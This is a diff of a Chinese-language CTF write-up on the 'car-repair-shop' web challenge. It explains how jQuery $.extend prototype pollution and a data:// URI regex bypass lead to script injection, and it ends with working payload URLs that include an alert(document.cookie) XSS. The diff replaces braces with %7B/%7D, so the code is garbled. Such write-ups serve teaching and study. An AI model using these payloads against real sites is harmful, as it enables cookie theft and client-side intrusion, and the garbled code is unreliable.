@@ -5,7 +5,7 @@
 
 
                                 阅读量   
-                                **761545**
+                                **761591**
                             
                         |
                         
@@ -32,24 +32,24 @@ const porsche = new Car('Porsche', '911', 'yellow', 'assets/images/porsche.png')
 
 const cars = [bugatti, porsche]
 
-porsche.repair = () =&gt; {
-    if(!bugatti.isStarted()){
+porsche.repair = () =&gt; %7B
+    if(!bugatti.isStarted())%7B
         infobox(`Not so fast. Repair the other car first!`)
-    }
-    else if($.md5(porsche) == '9cdfb439c7876e703e307864c9167a15'){
-        if(urlParams.has('help')) {
+    %7D
+    else if($.md5(porsche) == '9cdfb439c7876e703e307864c9167a15')%7B
+        if(urlParams.has('help')) %7B
             repairWithHelper(urlParams.get('help'))
-        }
-    }
-    else{
+        %7D
+    %7D
+    else%7B
         infobox(`Repairing this is not that easy.`)
-    }
-}
-porsche.ignition = () =&gt; {
+    %7D
+%7D
+porsche.ignition = () =&gt; %7B
     infobox(`Hmm ... WTF!`)
-}
+%7D
 
-$(document).ready(() =&gt; {
+$(document).ready(() =&gt; %7B
     const [car] = cars
     $('.fa-power-off').click(() =&gt; car.powerOn())
     $('.fa-car').click(() =&gt; car.info())
@@ -64,46 +64,46 @@ $(document).ready(() =&gt; {
         autoStart(bugatti)
     if(h.includes('Porsche'))
         autoStart(porsche)
-})
+%7D)
 
 
-const nextCar = () =&gt; {
+const nextCar = () =&gt; %7B
     cars.push(cars.shift())
     $(".image").attr('src', cars[0].pic);
-}
+%7D
 
 
-const autoStart = (car) =&gt; {
+const autoStart = (car) =&gt; %7B
     car.repair()
     car.ignition()
     car.powerOn()
-}
+%7D
 
 
-const repairWithHelper = (src) =&gt; {
+const repairWithHelper = (src) =&gt; %7B
     /* who needs csp anyways !? */
-    urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
-    if (urlRegx.test(src)) {
+    urlRegx = /^w%7B4,5%7D://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
+    if (urlRegx.test(src)) %7B
         let s = document.createElement('script')
         s.src = src
         $('head').append(s)
-    }
-}
+    %7D
+%7D
 
 
-const infobox = (text) =&gt; {
-    $('a').css({'pointer-events': 'none', 'border': 'none'})
+const infobox = (text) =&gt; %7B
+    $('a').css(%7B'pointer-events': 'none', 'border': 'none'%7D)
     $('.infobox').addClass('infoAnimate')
         .text(text)
-        .on('animationend', function() {
+        .on('animationend', function() %7B
             $(this).removeClass('infoAnimate')
-            $('a').css({'pointer-events': 'all', 'border': 'solid 1px rgba(255, 255, 255, .25)'})
-    })
+            $('a').css(%7B'pointer-events': 'all', 'border': 'solid 1px rgba(255, 255, 255, .25)'%7D)
+    %7D)
 
-}
+%7D
 
-class Car {
-    constructor(type, model, color, pic, key="") {
+class Car %7B
+    constructor(type, model, color, pic, key="") %7B
         this.type = type
         this.model = model
         this.color = color
@@ -111,46 +111,46 @@ class Car {
         this.pic = pic
 
         let started = false
-        this.start = () =&gt; {
+        this.start = () =&gt; %7B
             started = true
-        }
-        this.isStarted = () =&gt; {
+        %7D
+        this.isStarted = () =&gt; %7B
             return started
-        }
-    }
-    powerOn() {
-        if (this.isStarted()) {
+        %7D
+    %7D
+    powerOn() %7B
+        if (this.isStarted()) %7B
             infobox(`Well Done!`)
             nextCar()
 
-        } else {
+        %7D else %7B
             $('.chargeup')[0].play()
-        }
-    }
-    info() {
-        infobox(`This car is a ${this.type} ${this.model} in ${this.color}. It looks very nice! But it seems to be broken ...`)
-    }
-    repair() {
-        if(urlParams.has('repair')) {
+        %7D
+    %7D
+    info() %7B
+        infobox(`This car is a $%7Bthis.type%7D $%7Bthis.model%7D in $%7Bthis.color%7D. It looks very nice! But it seems to be broken ...`)
+    %7D
+    repair() %7B
+        if(urlParams.has('repair')) %7B
             $.extend(true, this, JSON.parse(urlParams.get('repair')))
-        }
-    }
-    light() {
+        %7D
+    %7D
+    light() %7B
         infobox(`You turn on the lights ... Nothing happens.`)
-    }
-    battery() {
+    %7D
+    battery() %7B
         infobox(`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`)
-    }
-    ignition() {
-        if (this.key == "") {
+    %7D
+    ignition() %7B
+        if (this.key == "") %7B
             infobox(`Looks like the key got lost. No wonder the car is not starting ...`)
-        }
-        if (this.key == "🔑") {
+        %7D
+        if (this.key == "🔑") %7B
             infobox(`The car started!`)
             this.start()
-        }
-    }
-}
+        %7D
+    %7D
+%7D
 
 &lt;!-- &lt;script src="assets/js/car.key.js"&gt;&lt;/script&gt; --&gt;
 ```
@@ -165,15 +165,15 @@ const porsche = new Car('Porsche', '911', 'yellow', 'assets/images/porsche.png')
 通读代码找一下能够x的点，发现在`repairWithHelper`函数中存在script src可控的情况，不过传入的url要经过一个正则的限制。我们首先追一下怎么能调用到`repairWithHelper`函数
 
 ```
-const repairWithHelper = (src) =&gt; {
+const repairWithHelper = (src) =&gt; %7B
     /* who needs csp anyways !? */
-    urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
-    if (urlRegx.test(src)) {
+    urlRegx = /^w%7B4,5%7D://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
+    if (urlRegx.test(src)) %7B
         let s = document.createElement('script')
         s.src = src
         $('head').append(s)
-    }
-}
+    %7D
+%7D
 ```
 
 Jquery加载完dom之后，取锚点的值为h，并判断是否包含bugatti、porsche字段值，而后将对象传入相应的autoStart函数执行。
@@ -188,11 +188,11 @@ if(h.includes('Porsche'))
 autoStart中对car对象的调用方法不尽相同。对于bugatti来说，Car类中存在上述三个方法，而当对象为porsche的时候，方法ignition、repair会被改写。其中，在`porsche.repair()`方法中实现了`repairWithHelper`调用
 
 ```
-const autoStart = (car) =&gt; {
+const autoStart = (car) =&gt; %7B
     car.repair()
     car.ignition()
     car.powerOn()
-}
+%7D
 ```
 
 省略中间步骤，梳理一下调用链大致需要经过两个重要的逻辑：
@@ -200,14 +200,14 @@ const autoStart = (car) =&gt; {
 1、需要先repair第一辆名为”Bugatti”的车，改变bugatti.key = 🔑<br>
 2、使$.md5(porsche) == $.md5(“lol”)
 
-先看第一个点，由于Car类内部`ignition()`方法调用了$extend，同时获取url参数`repair`用来合并Car类内属性，那么就可以通过传参覆盖key的值，因此构造`repair={"key":"%F0%9F%94%91"}`就能轻松过第一个步骤。
+先看第一个点，由于Car类内部`ignition()`方法调用了$extend，同时获取url参数`repair`用来合并Car类内属性，那么就可以通过传参覆盖key的值，因此构造`repair=%7B"key":"%F0%9F%94%91"%7D`就能轻松过第一个步骤。
 
 ```
-repair() {
-    if(urlParams.has('repair')) {
+repair() %7B
+    if(urlParams.has('repair')) %7B
         $.extend(true, this, JSON.parse(urlParams.get('repair')))
-    }
-}
+    %7D
+%7D
 ```
 
 同时$extend()方法也存在原型链污染问题，见文章:https://hackerone.com/reports/454365。这也是bypass第二步$.md5(porsche) == $.md5(“lol”)的关键，那么如何操作对象常量porsche？
@@ -229,7 +229,7 @@ repair() {
 综上，我们可以构造如下payload绕过以上两点的限制：
 
 ```
-https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?&amp;repair={"key":"%F0%9F%94%91","__proto__":{"__proto__":["lol"]}}#PorscheBugatti
+https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?&amp;repair=%7B"key":"%F0%9F%94%91","__proto__":%7B"__proto__":["lol"]%7D%7D#PorscheBugatti
 ```
 
 [![](https://p5.ssl.qhimg.com/dm/1024_121_/t01e54e79378e89cfd1.png)](https://p5.ssl.qhimg.com/dm/1024_121_/t01e54e79378e89cfd1.png)
@@ -237,15 +237,15 @@ https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?&amp;repair={"key"
 接着就是以help为参数的引入script标签的src，不过要先bypass一段正则:
 
 ```
-urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
+urlRegx = /^w%7B4,5%7D://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
 ```
 
 这里是不可能污染原型的，因为会被重新赋值。可控点为car-repair-shop前后的字段。
 
-参考官方wp解法，由于w{4,5}使得协议可控，用data://作为资源加载恶意的xss，同时data不关心mime的类型，使得我们可以把白名单的host放到mime的位置。其实对于src这个属性来说，应该是都支持data资源的调用。最终payload如下:
+参考官方wp解法，由于w%7B4,5%7D使得协议可控，用data://作为资源加载恶意的xss，同时data不关心mime的类型，使得我们可以把白名单的host放到mime的位置。其实对于src这个属性来说，应该是都支持data资源的调用。最终payload如下:
 
 ```
-https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/hpdoger/,alert(document.cookie)//car.key.js&amp;repair={"key":"🔑","__proto__":{"__proto__":["lol"]}}#BugattiPorsche
+https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/hpdoger/,alert(document.cookie)//car.key.js&amp;repair=%7B"key":"🔑","__proto__":%7B"__proto__":["lol"]%7D%7D#BugattiPorsche
 ```
 
 [![](https://p5.ssl.qhimg.com/t019fd50377d6fa6b63.png)](https://p5.ssl.qhimg.com/t019fd50377d6fa6b63.png)
